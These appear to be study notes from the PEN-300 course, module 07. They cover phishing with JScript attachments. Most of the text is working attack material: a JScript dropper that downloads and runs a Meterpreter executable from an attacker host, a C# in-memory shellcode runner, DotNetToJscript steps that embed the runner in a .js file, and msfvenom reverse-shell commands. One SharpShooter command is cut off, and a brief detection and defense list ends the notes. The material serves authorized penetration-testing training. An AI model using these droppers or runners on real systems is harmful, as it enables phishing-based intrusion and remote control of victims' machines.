PEN-300 Module 07 — Phishing with Jscript (JScript droppers to in-memory C#)

Fuente: material del curso correspondiente (sin video público)

Objective

Use the Jscript file format (wscript / Windows Script Host) as a phishing attachment for client-side code execution — the vector behind modern strains like TrickBot and Emotet. Build a basic dropper (launch cmd.exe), upgrade to a JScript Meterpreter dropper, then achieve fully in-memory execution by embedding a compiled C# assembly with DotNetToJscript, hand-rolling a C# shellcode runner, automating with SharpShooter, and finally loading .NET assemblies through PowerShell without touching disk.

Overlap note: this module walks the same JScript/WSH chain as module 06 (Client Side Code Execution with Windows Script Host). Differences that matter here: the lab uses a Windows 11 dev machine (dev01), a different lab subnet, a mandatory Program.cs patch in DotNetToJScript, a .NET 4.8 retarget step, and explicit Python 2 install commands for SharpShooter.

Target surface

  • Kali attacker: 192.168.251.151 (web root /var/www/html, Samba share \\192.168.251.151\visualstudio, SMB user kali).
  • Windows 11 victim/dev machine: user Offsec in C:\Users\Offsec; C:\Tools working dir for DotNetToJscript binaries; exercises under c:\tools\exercises (flag1.js … flag5.txt).

Techniques

1. Execution of JScript on Windows

  • Windows identifies files by extension, mapped to default apps (Settings > Apps > Default apps > Choose default apps by file type).
  • .ps1 → Notepad: double-click opens an editor, never executes.
  • .js → Windows-Based Script Host: double-click executes. Outside the browser, JScript (Microsoft's ECMAScript dialect from IE) is not subject to any browser sandbox and can drive ActiveX and the WSH engine directly — no vulnerability required.

Minimal ActiveX execution:

var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe");

WSH exits as soon as the script completes — it won't linger in Process Explorer.

Exercise: the default app for .vba files is the VBA Editor (multiple-choice answer); ActiveX is the technology JScript leverages against WSH. flag1.js requires finding and fixing a JScript syntax error.

2. JScript Meterpreter dropper

Build up from an HTTP GET using the undocumented-but-universal MSXML2.XMLHTTP object (Microsoft XML Core Services based):

var url = "http://192.168.251.151/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', url, false);   // method, URL, synchronous
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');
    Stream.Open();
    Stream.Type = 1;                    // adTypeBinary
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;
    Stream.SaveToFile("met.exe", 2);    // adSaveCreateOverWrite
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");

Prep: msfvenom 64-bit windows/x64/meterpreter/reverse_https EXE named met.exe into the Kali web root; matching multi/handler waiting. Double-click the .js → 64-bit shell. JScript supports proxy configuration via the setProxy method.

Exercises: SaveToFile() is the method that writes the payload to disk; MSXML2.XMLHTTP performs the GET; the 2 argument of SaveToFile forces overwrite. flag2.js must be repaired to yield a reverse Meterpreter shell.

3. Visual Studio + Kali Samba persistence

The Windows 11 dev VM reverts wipe code, so a Kali Samba share stores projects:

sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
sudo nano /etc/samba/smb.conf        # [visualstudio] path=/home/kali/data, browseable=yes, read only=no
sudo smbpasswd -a kali
sudo systemctl start smbd && sudo systemctl start nmbd
mkdir /home/kali/data && chmod -R 777 /home/kali/data

In Visual Studio (the C# IDE; Mono compiles the same code): Create a new project > C# > Console App (.NET Framework), with Location set to the SMB share. Solution = parent unit, may hold several projects; Program.cs is the default source file with Main as the entry point. Add Console.WriteLine("Hello World"), switch Debug → Release (debug info can trip security scanners), Build Solution, then run from \\192.168.251.151\visualstudio\ConsoleApp1\ConsoleApp1\bin\Release\ConsoleApp1.exe.

Exercises: project type is Console App (.NET Framework); Console.WriteLine() prints; flag3.txt needs code corrections before compiling.

4. DotNetToJscript (James Forshaw, 2017)

Copy the DotNetToJscript project from the Windows 11 machine onto the Samba share and open it in Visual Studio:

  • Opening a remote solution triggers a security warning: config files in a remote project are themselves a client-side code execution vector — accept it.
  • Accept the prompt to retarget the project to .NET Framework 4.8.
  • Mandatory patch: in the DotNetToJScript project's Program.cs, comment out the if-block at line 154 — it checks for .NET version 2 only and breaks the tool on newer runtimes.

The ExampleAssembly project compiles to the DLL JScript will execute; its entry point is the class constructor:

using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
        MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}

Compile the full solution in Release, then stage files in C:\Tools — DotNetToJscript.exe + NDesk.Options.dll (from DotNetToJScript/bin/Release) and ExampleAssembly.dll (from ExampleAssembly/bin/Release). The DLLs must be present for every conversion:

C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js

--ver=v4 because modern Windows 11 ships only .NET Framework 4 enabled by default.

Generated JScript anatomy:

  1. setversion() — pins the CLR: new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319'.
  2. debug(s) — empty stub (only populated with the -d flag).
  3. base64ToStream(b) — Base64 → System.IO.MemoryStream via System.Text.ASCIIEncoding, System.Security.Cryptography.FromBase64Transform, all instantiated through ActiveXObject.
  4. Main body: serialized_obj = Base64 binary-serialized assembly blob; entry_class = 'TestClass'; then:
setversion();
var stm = base64ToStream(serialized_obj);
var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var al = new ActiveXObject('System.Collections.ArrayList');
var d = fmt.Deserialize_2(stm);
al.Add(undefined);
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
  • Deserialize_2 is not a documented BinaryFormatter method — it's a workaround bypassing security restrictions in certain .NET versions.
  • DynamicInvoke takes an argument array; since the constructor needs none, an ArrayList with one undefined element is converted via ToArray() into an empty argument array. CreateInstance(entry_class) then runs the constructor.

Exercise: modify TestClass.cs to launch cmd.exe instead of the MessageBox. Multiple-choice anchors: compile in Release mode; base64ToStream decodes the blob; CreateInstance instantiates the named class inside the assembly. flag4.txt needs fixing before compiling.

5. Win32 API calls from C

P/Invoke with [DllImport] — signatures from www.pinvoke.net (search MessageBox). Declarations go inside the class but outside Main; required namespaces: System (basic types like IntPtr), System.Diagnostics, System.Runtime.InteropServices.

using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

        static void Main(string[] args)
        {
            MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);
        }
    }
}

Key contrast with the PowerShell module: no Add-Type or reflection complexity needed, because the assembly is compiled before delivery and executed in memory on the victim — nothing is written to disk at execution time.

6. C# shellcode runner

Recombine the VBA/PowerShell triad — VirtualAlloc, CreateThread, WaitForSingleObject:

[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

static void Main(string[] args)
{
    byte[] buf = new byte[626] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8... };  // 64-bit staged meterpreter, csharp format
    int size = buf.Length;
    IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);    // RWX, commit+reserve
    Marshal.Copy(buf, 0, addr, size);                                  // no namespace prefix needed in C#
    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    WaitForSingleObject(hThread, 0xFFFFFFFF);                          // keep process alive for the shell
}

Critical detail: JScript runs in a 64-bit context by default on x64 Windows, so the shellcode must be 64-bit; before compiling, set the platform to x64 via Configuration Manager (Platform drop-down → <New...> → x64).

Exercises: the runner's purpose is executing shellcode in memory via Win32 APIs; Marshal.Copy moves the bytes. Extra mile: rebuild as a bind shell runner and connect to the target port.

7. JScript shellcode runner (final deliverable)

  1. Move the three DllImport declarations into TestClass (class scope, outside the constructor) and place the shellcode + calls inside the TestClass() constructor.
  2. Compile ExampleAssembly for x64.
  3. Convert: C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
  4. Double-click runner.js with multi/handler up → staged reverse Meterpreter from a payload embedded entirely in the JScript file.

Exercise anchors: DllImports belong inside TestClass but outside its methods; VirtualAlloc allocates the memory.

Replicate the manual workflow:

sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o /var/www/html/shell.txt
# Payload size: 716 bytes

sudo python2 SharpShooter.py --payload js --dotnetver 4 --stageless \

Exercises: SharpShooter generates/executes arbitrary C# source in various formats; output format here is Jscript; all three obfuscation options (comments, renaming, whitespace) apply. Extra mile: build the staged HTML-smuggling delivery.

9. In-memory PowerShell assembly loading

Combine PowerShell + compiled C#: load an assembly through PowerShell without touching disk (details carried into the next module):

  • PowerShell's popularity with testers and malware authors has driven vendors (including Microsoft) to harden against it; C# shares scrutiny but broadens the toolkit.
  • JScript has no known way to invoke Win32 APIs directly — hence the embedded-assembly approach giving .NET-level capability from a .js file.

Extraction artifacts / notes

  • Shellcode sizes differ between listings (626 in Listing 31/34, 630 in Listing 32, and msfvenom's 716 bytes for the raw stager) — separate payload generations; the ... inside byte arrays is extractor truncation.
  • The LHOST differs between sections: 192.168.251.151 for the dropper/SMB lab and 192.168.119.120 in the SharpShooter msfvenom command — both verbatim from the source.

  • Inline multiple-choice exercise blocks are interspersed mid-text without their surrounding figure markers; answers distilled above where the text states them.
  • "Nashhorn" is a typo for Nashorn (Java's built-in JS engine) in Wrapping Up, which also name-drops HTA/Demiguise, IronPython/Trinity, Java Applets/JARs, and jRAT/Adwind.

Detection & defense

  • Double-clickable script formats: .js/.jse/.vbs/.wsf execute via WSH on double-click — remove associations or apply attack-surface-reduction rules blocking JS/VBS from launching downloaded content.
  • ActiveX abuse in WSH: WScript.Shell, MSXML2.XMLHTTP, ADODB.Stream, and .NET classes instantiated through ActiveXObject constitute the entire kill chain — alert on wscript.exe spawning processes or making network connections.
  • BinaryFormatter deserialization from script (Deserialize_2 + DynamicInvoke + COMPLUS_Version env pinning) is the DotNetToJscript fingerprint.
  • Remote development shares: opening VS solutions from SMB is flagged by Visual Studio itself as an execution vector — treat unsolicited remote project/config files as phishing payloads.
  • Reflective assembly loading from WebClient-fetched bytes in PowerShell; paired with the HTML smuggling delivery covered next.
